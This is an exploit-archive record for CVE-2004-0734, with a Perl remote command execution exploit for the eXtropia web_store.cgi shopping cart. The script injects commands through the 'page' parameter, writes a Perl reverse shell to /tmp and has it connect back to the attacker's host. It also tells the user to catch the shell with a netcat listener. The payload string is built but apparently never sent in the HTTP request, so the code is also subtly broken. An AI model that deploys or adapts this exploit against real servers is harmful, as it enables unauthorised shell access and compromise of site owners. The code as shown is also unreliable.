{
  "id": "1048",
  "title": "eXtropia Shopping Cart - &#039;web_store.cgi&#039; Remote Command Execution",
  "cve": "CVE-2004-0734",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl -w\r\n#\r\n#********************************************************************************************\r\n#               Remote Command Execution Vulnerability In Web_store.cgi                     *\r\n#                                                                                           *\r\n#                              [SegmentationFault Group]                                    *\r\n#                                                                                           *\r\n#                                                                                           *\r\n#             Greetz to  :  Xsupr3mo -  failed   - Status-x -  Stealh - P3S4D3L0            *\r\n#             Greetz to  :  berhooz  -   nima  - ehsan   - Unknown  OutLaw  eutanasia       *\r\n#                                      www.ashiyane.com                                     *\r\n#                                                                                           *\r\n#********************************************************************************************\r\n#ok setp by setp to work :                      *                                           *\r\n#[*] start exploit                              *   If connect back shell not found: maybe :*\r\n#[*] run in your system: nc -l -vv -p 2975      *   you do not have perm to write in /tmp   *\r\n#[*] starting connect back on 127.0.0.1 :2975   *            Shell not vulnerable           *\r\n#[*] DONE!                                      *   test and put in /$path/hints.pl?|cd /tmp*\r\n#[*] Look netcat windows                        *     other path that u know dont have perm *\r\n#                                               *                                           *\r\n#********************************************************************************************\r\n#############################################################################################\r\nuse IO::Socket;\r\n\r\nprint \"*****************************************************************\\n\";\r\nprint \"\\tRemote Command Execution Vulnerability in web_store.cgi\\n  \";\r\nprint \"\\t\\t-=[  SegmentationFault Group  ]=-\\n\";      \r\nprint \"\\t\\tcode writen    by sun-os [ActionSpider]\\n\\n\";  \r\nprint \"\\tGerttz to : Xsupr3mo -  failed   - Status-x -  Stealh\";\r\nprint \"\\n\\tand : Behrooz - nima - ehsan www.ashiyane.com\\n\";\r\nprint \"*****************************************************************\\n\\n\";\r\n\r\n\r\nprint \"enter hostname or ip : \\n\";\r\nchomp($server=<STDIN>);\r\n\r\nprint \"port: (default: 80)\\n\";\r\nchomp($port=<STDIN>);\r\n$port=80 if ($port =~/\\D/ );\r\n$port=80 if ($port eq \"\" );\r\n\r\nprint \"path: (???/web_store.cgi?)\\n\";\r\nchomp($path=<STDIN>);\r\n\r\nprint \"your ip (for reverse connect): \\n\";\r\nchomp($ip=<STDIN>);\r\n\r\nprint \"your port (for reverse connect): \\n\";\r\nchomp($reverse=<STDIN>);\r\n\r\nprint \"ok Remote Command Execution now Start\";\r\nprint \"|+| try to exploiting...\\n\";\r\n\r\n$string=\"/$path/web_store.cgi?page=.html|cd /tmp;echo \".q{use Socket;$execute= 'echo \"`uname -a`\";echo \"`id`\";/bin/sh';$target=$ARGV[0];$port=$ARGV[1];$iaddr=inet_aton($target) || die(\"Error: $!\\n\");$paddr=sockaddr_in($port, $iaddr) || die(\"Error: $!\\n\");$proto=getprotobyname('tcp');socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(\"Error: $!\\n\");connect(SOCKET, $paddr) || die(\"Error: $!\\n\");open(STDIN, \">&SOCKET\");open(STDOUT, \">&SOCKET\");open(STDERR, \">&SOCKET\");system($execute);close(STDIN)}.\" >>dc.pl;perl dc.pl $ip $reverse|\";\r\n\r\nprint \"|+| OK! \\n\";\r\nprint \"|+| NOW, run in your system: nc -l -vv -p $reverse\\n\";\r\nprint \"|+| starting connect back on $ip :$reverse\\n\";\r\nprint \"|+| DONE!\\n\";\r\nprint \"|+| Look netcat windows\\n\\n\";\r\n$socket=IO::Socket::INET->new( PeerAddr => $server, PeerPort => $port, Proto => tcp)\r\nor die;\r\n\r\nprint $socket \"POST $path HTTP/1.1\\n\";\r\nprint $socket \"Host: $server\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"User-Agent: blackbox\\n\";\r\nprint $socket \"Pragma: no-cache\\n\";\r\nprint $socket \"Cache-Control: no-cache\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\n\r\nprint \"have nice shell...\";\r\n\r\n# milw0rm.com [2005-06-15]",
  "url": "https://www.exploit-db.com/exploits/1048"
}